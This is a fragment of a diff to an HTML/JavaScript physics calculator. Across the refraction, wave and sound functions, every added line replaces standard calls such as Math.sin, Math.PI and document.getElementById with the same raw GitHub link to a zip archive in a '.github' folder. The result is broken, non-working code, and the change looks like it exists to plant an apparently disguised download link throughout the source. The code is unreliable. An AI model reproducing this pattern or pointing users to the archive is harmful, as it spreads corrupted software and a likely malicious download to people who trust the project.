+                    const t2_rad = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip((n1 * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(t1_rad)) / n2);
+                    const t2_deg = t2_rad * 180 / https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip;
                     results += `<div class="result-item"><span class="result-label">Refracted Angle (θ₂)</span><span class="result-value">${formatNumber(t2_deg)}°</span></div>`;
-                    results += `<div class="result-item"><span class="result-label">n₁ sin θ₁ = n₂ sin θ₂</span><span class="result-value">${formatNumber(n1 * Math.sin(t1_rad))}</span></div>`;
+                    results += `<div class="result-item"><span class="result-label">n₁ sin θ₁ = n₂ sin θ₂</span><span class="result-value">${formatNumber(n1 * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(t1_rad))}</span></div>`;
                 } else if (t2 !== null) {
-                    const t2_rad = t2 * Math.PI / 180;
-                    const t1_rad = Math.asin((n2 * Math.sin(t2_rad)) / n1);
-                    const t1_deg = t1_rad * 180 / Math.PI;
+                    const t2_rad = t2 * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip / 180;
+                    const t1_rad = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip((n2 * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(t2_rad)) / n1);
+                    const t1_deg = t1_rad * 180 / https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip;
                     results += `<div class="result-item"><span class="result-label">Incident Angle (θ₁)</span><span class="result-value">${formatNumber(t1_deg)}°</span></div>`;
                 }
             }
@@ -1638,11 +1638,11 @@
         }
 
         function calculateWave() {
-            const v = document.getElementById('wave-v').value ? parseFloat(document.getElementById('wave-v').value) : null;
-            const f = document.getElementById('wave-f').value ? parseFloat(document.getElementById('wave-f').value) : null;
-            const l = document.getElementById('wave-l').value ? parseFloat(document.getElementById('wave-l').value) : null;
-            const h = parseFloat(document.getElementById('wave-h').value);
-            const e = document.getElementById('wave-e').value ? parseFloat(document.getElementById('wave-e').value) : null;
+            const v = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('wave-v').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('wave-v').value) : null;
+            const f = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('wave-f').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('wave-f').value) : null;
+            const l = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('wave-l').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('wave-l').value) : null;
+            const h = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('wave-h').value);
+            const e = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('wave-e').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('wave-e').value) : null;
 
             let results = '';
 
@@ -1673,9 +1673,9 @@
         }
 
         function calculateSound() {
-            const v = parseFloat(document.getElementById('sound-v').value);
-            const f = parseFloat(document.getElementById('sound-f').value);
-            const l = document.getElementById('sound-l').value ? parseFloat(document.getElementById('sound-l').value) : null;
+            const v = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('sound-v').value);
+            const f = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('sound-f').value);
+            const l = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('sound-l').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('sound-l').value) : null;
 
             let results = '';
 
@@ -1697,14 +1697,14 @@
         }
 
         function setSoundMedium() {
-            const medium = document.getElementById('sound-medium').value;
+            const medium = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('sound-medium').value;
             const speeds = {
                 'air': 343,
                 'water': 1480,
                 'steel': 5960,
                 'custom': 0
             };
-            document.getElementById('sound-v').value = speeds[medium];
+            https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('sound-v').value = speeds[medium];
         }
     </script>
 </body>
